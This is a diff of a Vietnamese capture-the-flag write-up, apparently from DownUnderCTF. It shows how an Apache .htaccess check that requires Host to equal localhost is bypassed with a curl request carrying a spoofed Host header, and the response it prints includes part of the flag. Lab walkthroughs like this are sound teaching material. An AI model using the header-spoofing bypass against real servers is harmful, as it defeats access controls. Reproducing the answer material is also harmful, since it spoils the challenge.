@@ -14,13 +14,16 @@ Bạn thấy một mã trạng thái 403 hoặc một số thông báo khác cho
 
 # Ở file one/.htaccess ta thấy rằng nếu Host không phải là localhost, yêu cầu sẽ bị từ chối ngay lập tức với mã trạng thái 403 Forbidden (thông qua dòng RewriteRule ".*" "-" [F])
 RewriteEngine On
+
 RewriteCond %{HTTP_HOST} !^localhost$
+
 RewriteRule ".*" "-" [F]
 
 Vì vậy thiết lập header Host trong yêu cầu HTTP thành localhost.
 
 curl -i -s -k -X $'GET' -H $'Host: localhost' $'http://192.168.93.128:30026/one/flag.txt'
 
+'''text
 HTTP/1.1 200 OK
 Date: Tue, 15 Apr 2025 09:02:00 GMT
 Server: Apache/2.4.54 (Debian)
@@ -31,7 +34,7 @@ Content-Length: 16
 Content-Type: text/plain
 
 DUCTF{thats_it_
-
+'''
 
 
 # Ở file two/.htaccess ta thấy kiểm tra biến server THE_REQUEST, chứa toàn bộ dòng yêu cầu HTTP (ví dụ: GET /index.html HTTP/1.1). 
